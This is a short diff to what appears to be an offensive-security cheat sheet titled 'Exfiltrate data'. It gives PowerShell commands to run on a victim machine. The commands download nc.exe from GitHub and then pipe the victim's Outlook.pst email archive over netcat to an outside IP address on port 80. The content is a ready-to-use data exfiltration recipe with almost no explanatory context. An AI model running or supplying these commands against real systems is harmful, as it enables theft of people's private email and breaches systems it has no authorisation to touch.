@@ -1,5 +1,8 @@
+# Exfiltrate data
 On victim/client:
-```bash
+
+In powershell shell (powershell has the wget command):
+```cmd
 wget https://github.com/int0x33/nc.exe/raw/master/nc.exe -Outfile nc.exe
 cmd /c 'nc.exe -w 3 23.88.111.175 80 < Outlook.pst'
 ```
